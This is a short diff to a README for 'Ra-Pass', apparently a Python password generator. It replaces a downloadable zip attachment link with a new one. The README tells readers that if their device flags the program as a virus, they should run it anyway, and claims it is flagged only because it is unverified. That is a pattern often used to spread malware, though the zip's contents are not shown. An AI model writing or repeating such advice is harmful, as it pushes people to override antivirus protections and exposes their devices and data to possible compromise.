@@ -4,6 +4,6 @@ Ra-Pass is a simple program, programmed in Python: that allows you to generate p
 
 # Download Ra-Pass
 
-[Ra-Pass.zip](https://github.com/user-attachments/files/18717965/Ra-Pass.zip)
+[Ra-Pass.zip](https://github.com/user-attachments/files/18718085/Ra-Pass.zip)
 
 If your device says that Ra-Pass might be a virus, run the program anyway. Ra-Pass is not a virus and Ra-Pass might be flagged as an virus due to the program not being verified by the owner.
